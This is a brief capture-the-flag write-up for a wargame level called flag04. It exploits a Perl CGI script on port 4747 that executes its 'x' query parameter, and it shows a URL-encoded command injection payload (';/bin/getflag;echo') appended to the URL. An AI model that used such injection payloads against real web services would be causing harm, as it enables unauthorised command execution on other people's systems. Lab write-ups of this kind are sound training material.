# flag04

We are given a port (`4747`) and a perl CGI script which runs whatever is provided in its query param `x`.

We can go to `http://<ip>:4747/?x=hi` and see that it prints `hi`.

Let's URL-encode a shell pipeline( `;/bin/getflag;echo` -> `%3B%2Fbin%2Fgetflag%3Becho`) and append it to the URL.

`http://<ip>:4747/?x=%3B%2Fbin%2Fgetflag%3Becho`

We are now given the flag 04 and can login as `level05`.
